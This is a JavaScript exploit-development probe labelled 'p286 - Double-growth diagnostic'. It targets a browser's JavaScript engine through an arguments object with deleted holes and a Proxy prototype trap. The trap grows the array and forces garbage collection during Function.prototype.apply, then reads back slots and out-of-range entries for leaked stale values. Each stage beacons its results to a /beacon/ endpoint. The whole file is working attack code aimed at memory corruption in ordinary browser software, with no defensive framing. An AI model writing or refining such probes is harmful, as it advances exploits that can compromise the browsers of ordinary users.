// p286 - Double-growth diagnostic: multiple holes = multiple trap fires
// Tests whether intermediate butterflies become collectible
// Beacon prefix: V286-

(function() {
  function B(tag, body) {
    var url = '/beacon/V286-' + tag + '?t=' + Date.now();
    try {
      if (body) navigator.sendBeacon(url, String(body).substring(0, 900));
      else new Image().src = url;
    } catch(e) {}
  }
  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  function target() { return arguments; }
  function reader() { return Array.prototype.slice.call(arguments); }

  function attempt(round) {
    var N = 64;
    var HOLES = [5, 15, 25, 35];
    var argArr = [];
    for (var i = 0; i < N; i++) {
      if (HOLES.indexOf(i) !== -1) argArr.push(i + 1);
      else argArr.push(i + 1);
    }
    var args = target.apply(null, argArr);
    for (var h = 0; h < HOLES.length; h++) {
      delete args[HOLES[h]];
    }

    var trapCount = 0;
    var growSizes = [200, 500, 1000, 2000];
    var markers = [0xAAAA0000, 0xBBBB0000, 0xCCCC0000, 0xDDDD0000];

    var trap = {
      get: function(t, prop) {
        var myIdx = trapCount;
        trapCount++;

        if (myIdx >= 4) return 0xFACE;

        var sz = growSizes[myIdx];
        for (var j = N; j < N + sz; j++) {
          args[j] = 0x41410000 + myIdx;
        }

        var mk = markers[myIdx];
        for (var k = 0; k < 5; k++) {
          args[k] = mk + k;
        }

        B('R' + round + '-TRAP' + myIdx + '-GREW-' + sz);

        if (myIdx >= 1) {
          for (var g = 0; g < 20; g++) {
            var batch = [];
            for (var b = 0; b < 5000; b++) {
              batch.push({gc: b, pad: 'XXXX'});
            }
            batch = null;
          }
          B('R' + round + '-TRAP' + myIdx + '-GC-DONE');
        }

        return 0xBEEF0000 + myIdx;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));

    var result;
    try {
      result = reader.apply(null, args);
    } catch(e) {
      B('R' + round + '-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) { B('R' + round + '-NO-RESULT'); return; }
    B('R' + round + '-TRAPS-' + trapCount + '-LEN-' + result.length);

    var slotData = '';
    for (var i = 0; i < 5; i++) {
      var v = result[i];
      if (typeof v === 'number') slotData += i + '=' + hex(v >>> 0) + ' ';
      else if (typeof v === 'object') slotData += i + '=OBJ ';
      else slotData += i + '=?' + typeof v + ' ';
    }
    B('R' + round + '-SLOTS-0-4', slotData.trim());

    var holeData = '';
    for (var h = 0; h < HOLES.length; h++) {
      var hi = HOLES[h];
      var hv = result[hi];
      if (typeof hv === 'number') holeData += hi + '=' + hex(hv >>> 0) + ' ';
      else if (hv === undefined) holeData += hi + '=undef ';
      else holeData += hi + '=?' + typeof hv + ' ';
    }
    B('R' + round + '-HOLES', holeData.trim());

    var origCount = 0;
    for (var i = 6; i < Math.min(result.length, N); i++) {
      if (HOLES.indexOf(i) !== -1) continue;
      if (typeof result[i] === 'number' && result[i] === (i + 1)) origCount++;
    }
    B('R' + round + '-ORIG-' + origCount + '-OF-' + (N - HOLES.length - 6));

    var newSlot = '';
    for (var i = N; i < Math.min(result.length, N + 5); i++) {
      var v = result[i];
      if (v !== undefined) newSlot += i + '=' + hex(v >>> 0) + ' ';
    }
    if (newSlot) B('R' + round + '-BEYOND-N', newSlot.trim());
  }

  var round = 0;
  function runNext() {
    if (round >= 4) { B('DONE'); return; }
    attempt(round);
    round++;
    setTimeout(runNext, 100);
  }
  runNext();
})();
